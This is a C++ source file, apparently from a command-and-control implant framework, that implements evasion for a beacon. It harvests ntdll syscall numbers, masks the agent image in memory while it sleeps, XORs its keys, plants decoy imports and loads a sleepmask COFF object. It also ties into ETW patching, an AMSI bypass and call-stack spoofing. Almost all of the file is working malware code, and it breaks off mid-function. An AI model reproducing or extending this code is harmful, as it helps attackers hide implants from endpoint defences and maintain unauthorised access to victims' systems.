#include <common.h>
#include <module.h>
#include <coff.h>

using namespace stardust;

namespace starburst {

static auto declfn init_syscall_table( instance& inst ) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
    if ( !base ) return;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( base );
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( base + dos->e_lfanew );

    auto eat_rva  = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    auto eat_size = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    if ( !eat_rva ) return;

    auto eat       = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>( base + eat_rva );
    auto names     = reinterpret_cast<uint32_t*>( base + eat->AddressOfNames );
    auto ordinals  = reinterpret_cast<uint16_t*>( base + eat->AddressOfNameOrdinals );
    auto functions = reinterpret_cast<uint32_t*>( base + eat->AddressOfFunctions );

    for ( uint32_t i = 0; i < eat->NumberOfNames && inst.evasion.syscall_count < 64; i++ ) {
        auto name = reinterpret_cast<char*>( base + names[i] );

        if ( name[0] != 'N' || name[1] != 't' ) continue;
        if ( name[2] == 'D' && name[3] == 'l' && name[4] == 'l' ) continue;

        auto func_rva  = functions[ ordinals[i] ];

        // Skip forwarded exports (RVA falls within export directory range)
        if ( func_rva >= eat_rva && func_rva < eat_rva + eat_size ) continue;

        auto func_addr = base + func_rva;

        if ( func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
             func_addr[3] == 0xB8 ) {
            uint16_t ssn = *reinterpret_cast<uint16_t*>( func_addr + 4 );
            auto& entry = inst.evasion.syscall_table[ inst.evasion.syscall_count ];
            entry.hash = hash_string( name );
            entry.ssn  = ssn;
            inst.evasion.syscall_count++;
        }
    }

    auto sections = IMAGE_FIRST_SECTION( nt );
    for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
        if ( !( sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;

        auto sec_base = base + sections[s].VirtualAddress;
        auto sec_size = sections[s].Misc.VirtualSize;

        for ( uint32_t j = 0; j + 2 < sec_size; j++ ) {
            if ( sec_base[j] == 0x0F && sec_base[j+1] == 0x05 && sec_base[j+2] == 0xC3 ) {
                for ( uint32_t k = 0; k < inst.evasion.syscall_count; k++ ) {
                    inst.evasion.syscall_table[k].trampoline = sec_base + j;
                }
                goto trampoline_found;
            }
        }
    }
trampoline_found:

    DBG_PRINT( inst, "syscall table: %d entries, trampoline=%p\n",
               inst.evasion.syscall_count,
               inst.evasion.syscall_count > 0 ? inst.evasion.syscall_table[0].trampoline : nullptr );
}

static auto declfn init_sleep_mask( instance& inst ) -> void {
    auto status = inst.bcrypt_mod.BCryptGenRandom(
        nullptr,
        inst.evasion.ekko.rc4_key,
        16,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );

    if ( status == 0 ) {
        inst.evasion.ekko.img_base = inst.base.address;
        inst.evasion.ekko.img_size = static_cast<uint32_t>( inst.base.length );
        inst.evasion.ekko.initialized = true;
        DBG_PRINT( inst, "sleep mask init: base=%p size=%u\n",
                   (void*)inst.evasion.ekko.img_base, inst.evasion.ekko.img_size );
    }
}

static auto declfn xor_sensitive_data( instance& inst ) -> void {
    auto key = inst.evasion.ekko.rc4_key;
    for ( uint32_t i = 0; i < 32; i++ ) {
        inst.agent.aes_key[i] ^= key[ i % 16 ];
    }
    for ( uint32_t i = 0; i < 36; i++ ) {
        inst.agent.uuid[i] ^= key[ i % 16 ];
        inst.agent.payload_uuid[i] ^= key[ i % 16 ];
    }
}

static auto declfn iat_camouflage( instance& inst ) -> void {
    ULONG_PTR uAddress = reinterpret_cast<ULONG_PTR>(
        inst.ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 0x100 ) );
    if ( !uAddress ) return;

    if ( ( ( uAddress >> 8 ) & 0xFF ) > 0xFFFF ) {
        inst.advapi32.RegCloseKey( nullptr );
        inst.advapi32.RegOpenKeyExA( nullptr, nullptr, 0, 0, nullptr );
        inst.advapi32.RegQueryValueExA( nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
        inst.advapi32.RegEnumKeyExA( nullptr, 0, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
        inst.advapi32.RegSetValueExA( nullptr, nullptr, 0, 0, nullptr, 0 );
        inst.advapi32.RegCreateKeyExA( nullptr, nullptr, 0, nullptr, 0, 0, nullptr, nullptr, nullptr );
        inst.advapi32.OpenSCManagerW( nullptr, nullptr, 0 );
        inst.advapi32.OpenServiceW( nullptr, nullptr, 0 );
        inst.advapi32.QueryServiceConfigW( nullptr, nullptr, 0, nullptr );
        inst.advapi32.CloseServiceHandle( nullptr );
    }

    inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, reinterpret_cast<PVOID>( uAddress ) );
}

// ── Sleepmask-VS COFF loader + sleep ──

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)

#include <evasion/sleepmask_vs_data.h>

#define BOF_MASK_SIZE_SM 13

struct sm_heap_record { char* ptr; size_t size; };

struct sm_alloc_section {
    int Label; PVOID BaseAddress; SIZE_T VirtualSize;
    DWORD CurrentProtect; DWORD PreviousProtect;
    BOOL MaskSection; DWORD DripLoadPageSize;
};

struct sm_alloc_cleanup {
    BOOL Cleanup; int AllocationMethod; uint8_t AdditionalInfo[16];
};

struct sm_alloc_region {
    int Purpose; PVOID AllocationBase; SIZE_T RegionSize; DWORD Type;
    DWORD DripLoadAllocationGranularity;
    sm_alloc_section Sections[8];
    sm_alloc_cleanup CleanupInformation;
};

struct sm_alloc_memory { sm_alloc_region AllocatedMemoryRegions[6]; };

struct sm_beacon_info {
    unsigned int     version;
    char*            sleep_mask_ptr;
    DWORD            sleep_mask_text_size;
    DWORD            sleep_mask_total_size;
    char*            beacon_ptr;
    sm_heap_record*  heap_records;
    char             mask[BOF_MASK_SIZE_SM];
    sm_alloc_memory  allocatedMemory;
};

enum sm_win_api {
    SM_INTERNETOPENA, SM_INTERNETCONNECTA,
    SM_VIRTUALALLOC, SM_VIRTUALALLOCEX, SM_VIRTUALPROTECT, SM_VIRTUALPROTECTEX, SM_VIRTUALFREE,
    SM_GETTHREADCONTEXT, SM_SETTHREADCONTEXT, SM_RESUMETHREAD,
    SM_CREATETHREAD, SM_CREATEREMOTETHREAD,
    SM_OPENPROCESS, SM_OPENTHREAD, SM_CLOSEHANDLE,
    SM_CREATEFILEMAPPING, SM_MAPVIEWOFFILE, SM_UNMAPVIEWOFFILE,
    SM_VIRTUALQUERY, SM_DUPLICATEHANDLE,
    SM_READPROCESSMEMORY, SM_WRITEPROCESSMEMORY,
    SM_EXITTHREAD, SM_VIRTUALFREEEX, SM_VIRTUALQUERYEX,
    SM_WAITFORSINGLEOBJECT, SM_SLEEP
};

struct sm_function_call {
    PVOID      functionPtr;
    sm_win_api function;
    int        numOfArgs;
    ULONG_PTR  args[10];
    BOOL       bMask;
    ULONG_PTR  retValue;
};

typedef void (*sm_entry_fn)( sm_beacon_info*, sm_function_call* );

#ifndef TH32CS_SNAPTHREAD
#define TH32CS_SNAPTHREAD 0x00000004
#endif

struct sm_threadentry32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ThreadID;
    DWORD th32OwnerProcessID;
    LONG  tpBasePri;
    LONG  tpDeltaPri;
    DWORD dwFlags;
};

typedef HANDLE (WINAPI *fn_sm_CreateToolhelp32Snapshot)( DWORD, DWORD );
typedef BOOL   (WINAPI *fn_sm_Thread32First)( HANDLE, sm_threadentry32* );
typedef BOOL   (WINAPI *fn_sm_Thread32Next)( HANDLE, sm_threadentry32* );
typedef HANDLE (WINAPI *fn_sm_OpenThread)( DWORD, BOOL, DWORD );
typedef DWORD  (WINAPI *fn_sm_SuspendThread)( HANDLE );
typedef DWORD  (WINAPI *fn_sm_ResumeThread)( HANDLE );
typedef SIZE_T (WINAPI *fn_sm_VirtualQuery)( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );

static auto declfn sm_suspend_threads( instance& inst ) -> void {
    auto pSnap    = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst   = reinterpret_cast<fn_sm_Thread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext    = reinterpret_cast<fn_sm_Thread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen    = reinterpret_cast<fn_sm_OpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pSuspend = reinterpret_cast<fn_sm_SuspendThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pSuspend ) return;

    DWORD pid = inst.kernel32.GetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    sm_threadentry32 te = {};
    te.dwSize = sizeof( sm_threadentry32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pSuspend( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn sm_resume_threads( instance& inst ) -> void {
    auto pSnap   = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst  = reinterpret_cast<fn_sm_Thread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext   = reinterpret_cast<fn_sm_Thread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen   = reinterpret_cast<fn_sm_OpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pResume = reinterpret_cast<fn_sm_ResumeThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pResume ) return;

    DWORD pid = inst.kernel32.GetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    sm_threadentry32 te = {};
    te.dwSize = sizeof( sm_threadentry32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pResume( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn sm_query_protection( instance& inst, PVOID addr ) -> DWORD {
    auto pVQ = reinterpret_cast<fn_sm_VirtualQuery>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "VirtualQuery" ) ) );
    if ( !pVQ ) return PAGE_EXECUTE_READ;

    MEMORY_BASIC_INFORMATION mbi = {};
    if ( pVQ( addr, &mbi, sizeof( mbi ) ) == 0 ) return PAGE_EXECUTE_READ;
    return mbi.Protect;
}

static BOOL __cdecl declfn sm_beacon_get_syscall_stub( void*, SIZE_T, BOOL ) {
    return FALSE;
}

static auto declfn sm_resolve_symbol(
    instance& inst, const char* name
) -> void* {
    const char* n = name;
    while ( n[0] == '_' && n[1] == '_' && n[2] == 'i' && n[3] == 'm' &&
            n[4] == 'p' && n[5] == '_' )
        n += 6;

    char mod_name[64] = {};
    char func_name[128] = {};

    const char* dollar = n;
    while ( *dollar && *dollar != '$' ) dollar++;

    if ( *dollar == '$' ) {
        uint32_t mod_len = (uint32_t)( dollar - n );
        if ( mod_len < 59 ) {
            memory::copy( mod_name, const_cast<char*>( n ), mod_len );
            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
            mod_name[mod_len+4] = '\0';
        }
        auto fn = dollar + 1;
        uint32_t fn_len = 0;
        while ( fn[fn_len] ) fn_len++;
        if ( fn_len < 127 )
            memory::copy( func_name, const_cast<char*>( fn ), fn_len );

        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
        if ( h_mod ) {
            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
            if ( addr ) return (void*)addr;
        }
    } else {
        uint32_t h = 2166136261u;
        for ( const char* p = n; *p; p++ ) { h ^= (uint8_t)*p; h *= 16777619u; }
        if ( h == expr::hash_string( "BeaconGetSyscallInformation" ) )
            return (void*)sm_beacon_get_syscall_stub;
    }

    DBG_PRINT( inst, "sm_coff: unresolved: %s\n", name );
    return nullptr;
}

static auto declfn sm_compute_coff_text_size() -> uint32_t {
    if ( SLEEPMASK_VS_COFF_SIZE < sizeof( COFF_FILE_HEADER ) )
        return 0;

    auto data = const_cast<uint8_t*>( SLEEPMASK_VS_COFF );
    auto header = reinterpret_cast<COFF_FILE_HEADER*>( data );
    auto sections = reinterpret_cast<COFF_SECTION*>(
        data + sizeof( COFF_FILE_HEADER ) + header->SizeOfOptionalHeader );

    uint32_t total = 0;
    uint32_t text_end = 0;
    uint16_t max_sec = header->NumberOfSections < 64 ? header->NumberOfSections : 64;

    for ( uint16_t i = 0; i < max_sec; i++ ) {
        uint32_t sz = sections[i].SizeOfRawData;
        if ( sz == 0 ) sz = sections[i].VirtualSize;
        if ( sz == 0 ) sz = 64;

        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
             !( sections[i].Characteristics & 0x20000000 ) ) {
            total = ( total + 0xFFF ) & ~0xFFFu;
        }

        uint32_t offset = total;
        total += sz;

        if ( sections[i].Characteristics & 0x20000000 ) {
            uint32_t se = offset + sz;
            if ( se > text_end ) text_end = se;
        }
    }

    return text_end;
}

static auto declfn load_sleepmask_coff( instance& inst ) -> bool {
    if ( SLEEPMASK_VS_COFF_SIZE < sizeof( COFF_FILE_HEADER ) ) {
        DBG_PRINT( inst, "sleepmask-vs: no COFF data embedded\n" );
        return false;
    }

    auto data = const_cast<uint8_t*>( SLEEPMASK_VS_COFF );
    auto header = reinterpret_cast<COFF_FILE_HEADER*>( data );
    auto sections = reinterpret_cast<COFF_SECTION*>(
        data + sizeof( COFF_FILE_HEADER ) + header->SizeOfOptionalHeader );
    auto symbols = reinterpret_cast<COFF_SYMBOL*>(
        data + header->PointerToSymbolTable );
    auto string_table = reinterpret_cast<char*>( symbols + header->NumberOfSymbols );

    auto section_ptrs = static_cast<uint8_t**>(
        inst.heap_alloc( header->NumberOfSections * sizeof( uint8_t* ) ) );
    if ( !section_ptrs ) return false;

    uint32_t total_alloc = 0;
    uint32_t sec_offsets[64] = {};
    uint32_t sec_sizes[64] = {};
    uint16_t max_sec = header->NumberOfSections < 64 ? header->NumberOfSections : 64;

    for ( uint16_t i = 0; i < max_sec; i++ ) {
        sec_sizes[i] = sections[i].SizeOfRawData;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;

        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
             !( sections[i].Characteristics & 0x20000000 ) ) {
            total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
        }

        sec_offsets[i] = total_alloc;
        total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
    }
    total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
    uint32_t tramp_offset = total_alloc;
    total_alloc += header->NumberOfSymbols * 12;
    uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
    total_alloc = imp_offset + header->NumberOfSymbols * sizeof( void* );

    auto coff_base = static_cast<uint8_t*>(
        inst.kernel32.VirtualAlloc(
            nullptr, total_alloc,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
    if ( !coff_base ) {
        inst.heap_free( section_ptrs );
        return false;
    }

    for ( uint16_t i = 0; i < max_sec; i++ ) {
        section_ptrs[i] = coff_base + sec_offsets[i];
        if ( sections[i].SizeOfRawData > 0 )
            memory::copy( section_ptrs[i],
                data + sections[i].PointerToRawData,
                sections[i].SizeOfRawData );
    }

    auto tramp_ptr = coff_base + tramp_offset;
    uint32_t tramp_used = 0;
    auto imp_table = reinterpret_cast<void**>( coff_base + imp_offset );

    auto func_ptrs = static_cast<void**>(
        inst.heap_alloc( header->NumberOfSymbols * sizeof( void* ) ) );
    if ( !func_ptrs ) {
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        return false;
    }
    memory::zero( func_ptrs, header->NumberOfSymbols * sizeof( void* ) );

    void* entry_ptr = nullptr;

    for ( uint32_t i = 0; i < header->NumberOfSymbols; i++ ) {
        char sym_name[256] = {};
        if ( symbols[i].Name.Zeroes == 0 ) {
            auto long_name = string_table + symbols[i].Name.Offset;
            uint32_t nlen = 0;
            while ( long_name[nlen] && nlen < 255 ) nlen++;
            memory::copy( sym_name, long_name, nlen );
        } else {
            memory::copy( sym_name, symbols[i].ShortName, 8 );
        }

        if ( symbols[i].SectionNumber > 0 ) {
            uint16_t sec_idx = symbols[i].SectionNumber - 1;
            if ( sec_idx < max_sec )
                func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            if ( ( sym_name[0] == 's' && sym_name[1] == 'l' && sym_name[2] == 'e' &&
                   sym_name[3] == 'e' && sym_name[4] == 'p' && sym_name[5] == '_' &&
                   sym_name[6] == 'm' && sym_name[7] == 'a' && sym_name[8] == 's' &&
                   sym_name[9] == 'k' && sym_name[10] == '\0' ) ||
                 ( sym_name[0] == '_' && sym_name[1] == 's' && sym_name[2] == 'l' &&
                   sym_name[3] == 'e' && sym_name[4] == 'e' && sym_name[5] == 'p' &&
                   sym_name[6] == '_' && sym_name[7] == 'm' && sym_name[8] == 'a' &&
                   sym_name[9] == 's' && sym_name[10] == 'k' && sym_name[11] == '\0' ) ) {
                entry_ptr = func_ptrs[i];
            }
        } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
            bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
                          sym_name[4] == 'p' && sym_name[5] == '_';
            void* resolved = sm_resolve_symbol( inst, sym_name );
            if ( is_imp && resolved ) {
                imp_table[i] = resolved;
                func_ptrs[i] = &imp_table[i];
            } else if ( resolved ) {
                auto t = tramp_ptr + tramp_used * 12;
                t[0] = 0x48; t[1] = 0xB8;
                *reinterpret_cast<uint64_t*>( t + 2 ) =
                    reinterpret_cast<uint64_t>( resolved );
                t[10] = 0xFF; t[11] = 0xE0;
                func_ptrs[i] = t;
                tramp_used++;
            }
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if ( !entry_ptr ) {
        DBG_PRINT( inst, "sleepmask-vs: entry 'sleep_mask' not found\n" );
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        inst.heap_free( func_ptrs );
        return false;
    }

    for ( uint16_t s = 0; s < max_sec; s++ ) {
        if ( sections[s].NumberOfRelocations == 0 ) continue;
        auto relocs = reinterpret_cast<COFF_RELOCATION*>(
            data + sections[s].PointerToRelocations );
        for ( uint16_t r = 0; r < sections[s].NumberOfRelocations; r++ ) {
            uint32_t sym_idx = relocs[r].SymbolTableIndex;
            auto target = section_ptrs[s] + relocs[r].VirtualAddress;
            uintptr_t sym_addr = reinterpret_cast<uintptr_t>( func_ptrs[sym_idx] );
            if ( !sym_addr ) continue;

            switch ( relocs[r].Type ) {
                case IMAGE_REL_AMD64_ADDR64:
                    *reinterpret_cast<uint64_t*>( target ) += sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *reinterpret_cast<uint32_t*>( target ) += static_cast<uint32_t>(
                        sym_addr - reinterpret_cast<uintptr_t>( coff_base ) );
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 5 );
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 6 );
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 7 );
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 8 );
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 9 );
                    break;
            }
        }
    }

    for ( uint16_t i = 0; i < max_sec; i++ ) {
        if ( sections[i].Characteristics & 0x20000000 ) {
            DWORD old_protect;
            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
                PAGE_EXECUTE_READ, &old_protect );
        }
    }
    if ( tramp_used > 0 ) {
        DWORD old_protect;
        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
            PAGE_EXECUTE_READ, &old_protect );
    }

    inst.evasion.sleepmask_vs.code_base = coff_base;
    inst.evasion.sleepmask_vs.code_size = total_alloc;
    inst.evasion.sleepmask_vs.entry     = entry_ptr;
    inst.evasion.sleepmask_vs.loaded    = true;

    inst.heap_free( section_ptrs );
    inst.heap_free( func_ptrs );

    DBG_PRINT( inst, "sleepmask-vs: loaded, entry=%p, text=%u, total=%u\n",
        entry_ptr, sm_compute_coff_text_size(), total_alloc );
    return true;
}

static auto declfn build_sm_beacon_info(
    instance& inst, sm_beacon_info& info, sm_heap_record& sentinel
) -> void {
    memory::zero( &info, sizeof( sm_beacon_info ) );
    memory::zero( &sentinel, sizeof( sm_heap_record ) );

    info.version = 0x041200;
    info.sleep_mask_ptr = reinterpret_cast<char*>( inst.evasion.sleepmask_vs.code_base );
    info.sleep_mask_text_size = sm_compute_coff_text_size();
    info.sleep_mask_total_size = inst.evasion.sleepmask_vs.code_size;

    if ( inst.evasion.ekko.initialized ) {
        info.beacon_ptr = reinterpret_cast<char*>( inst.evasion.ekko.img_base );
        for ( int i = 0; i < BOF_MASK_SIZE_SM && i < 16; i++ )
            info.mask[i] = static_cast<char>( inst.evasion.ekko.rc4_key[i] );
    } else {
        info.beacon_ptr = reinterpret_cast<char*>( inst.base.address );
        ULONG seed = inst.kernel32.GetTickCount();
        for ( int i = 0; i < BOF_MASK_SIZE_SM; i++ ) {
            seed = inst.ntdll.RtlRandomEx( &seed );
            info.mask[i] = static_cast<char>( seed & 0xFF );
        }
    }

    sentinel.ptr = nullptr;
    sentinel.size = 0;
    info.heap_records = &sentinel;

    auto& region = info.allocatedMemory.AllocatedMemoryRegions[0];
    region.Purpose = 2; /* PURPOSE_BEACON_MEMORY */
    if ( inst.evasion.ekko.initialized ) {
        region.AllocationBase = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
        region.RegionSize = inst.evasion.ekko.img_size;
    } else {
        region.AllocationBase = reinterpret_cast<PVOID>( inst.base.address );
        region.RegionSize = inst.base.length;
    }
    region.Type = MEM_PRIVATE;

    if ( region.AllocationBase && region.RegionSize > 0 ) {
        auto& sec = region.Sections[0];
        sec.Label = 3; /* LABEL_TEXT */
        sec.BaseAddress = region.AllocationBase;
        sec.VirtualSize = region.RegionSize;
        DWORD prot = sm_query_protection( inst, region.AllocationBase );
        sec.CurrentProtect  = prot;
        sec.PreviousProtect = prot;
        sec.MaskSection = TRUE;
    }
}

#endif /* MASK_SLEEPMASK_VS && _WIN64 */

auto declfn evasion_on_init( instance& inst ) -> void {
    init_syscall_table( inst );
    init_sleep_mask( inst );
    iat_camouflage( inst );

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_init( inst );
#endif

#ifdef INCLUDE_EVASION_ETW
    evasion_patch_etw( inst );
#endif

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    load_sleepmask_coff( inst );
#endif
}

auto declfn evasion_on_cleanup( instance& inst ) -> void {
#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_cleanup( inst );
#endif

    for ( uint32_t i = 0; i < inst.evasion.syscall_count; i++ ) {
        inst.evasion.ekko.rc4_key[i] = 0;
    }
    inst.evasion.ekko.initialized = false;

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.code_base ) {
        inst.kernel32.VirtualFree( inst.evasion.sleepmask_vs.code_base, 0, MEM_RELEASE );
        inst.evasion.sleepmask_vs = {};
    }
#endif
}

#include <evasion/sleep_masks.h>

auto declfn evasion_pre_sleep( instance& inst ) -> void {
    mask_pre_sleep( inst );
}

auto declfn evasion_post_sleep( instance& inst ) -> void {
    mask_post_sleep( inst );
}

auto declfn evasion_full_image_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_FULL_IMAGE
    fi_sleep( inst, sleep_ms );
#else
    (void)inst; (void)sleep_ms;
#endif
}

auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
    if ( inst.evasion.ekko.initialized ) {
        ekko_sleep( inst, sleep_ms );
        return;
    }
#endif
    /* Fallback: standard pre-sleep → delay → post-sleep cycle */
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
}

auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_UDRL
    /*
     * UDRL sleep mask. When the UDRL loader provided user data, update
     * the ekko fields from it (the reflectively loaded image may live at
     * a different base than what RipStart() computed). Then dispatch to
     * Ekko (x64) or full-image XOR fallback.
     */
    if ( inst.evasion.udrl_user_data ) {
        /* UDRL_USER_DATA layout (with -fpack-struct=8):
         *   +0x00  uint64  magic
         *   +0x08  uint32  load_type  (+pad)
         *   +0x10  ptr     agent_base
         *   +0x18  uint32  agent_size (+pad)
         * Use agent_base/size to patch ekko fields so the mask covers
         * the reflectively loaded image, not the original shellcode. */
        auto ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
        uint64_t magic = *reinterpret_cast<uint64_t*>( ud );

        if ( magic == 0x5442525354ULL && inst.evasion.ekko.initialized ) {
            auto new_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
            auto new_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
            if ( new_base && new_size ) {
                inst.evasion.ekko.img_base = new_base;
                inst.evasion.ekko.img_size = new_size;
            }
        }
    }

#ifdef _WIN64
    if ( inst.evasion.ekko.initialized ) {
        ekko_sleep( inst, sleep_ms );
        return;
    }
#endif

    /* x86 or ekko not initialized: full-image XOR fallback */
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
#else
    (void)inst; (void)sleep_ms;
#endif
}

// VEH suspend/restore for sleepmask XOR safety.
// The AMSI/ETW VEH handler lives inside the beacon image. When the sleepmask
// COFF XORs the image, the handler becomes garbage - any exception during
// sleep (e.g. a DR hardware breakpoint) causes infinite VEH recursion and an
// ILLEGAL_INSTRUCTION crash. We clear hardware breakpoints and deregister the
// VEH before the XOR, then restore both after the image is un-XORed.
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64) && \
    defined(INCLUDE_EVASION_AMSI)

struct sm_veh_state { PVOID handle; DWORD64 dr0, dr1, dr7; };

static auto declfn sm_suspend_veh( instance& inst, sm_veh_state& s ) -> void {
    s = {};
    if ( !inst.evasion.amsi_veh ) return;
    s.handle = inst.evasion.amsi_veh;

    auto pNtGetCtx = reinterpret_cast<decltype(NtGetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtGetContextThread" ) ) );
    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtSetContextThread" ) ) );

    if ( pNtGetCtx && pNtSetCtx ) {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        pNtGetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
        s.dr0 = ctx.Dr0; s.dr1 = ctx.Dr1; s.dr7 = ctx.Dr7;
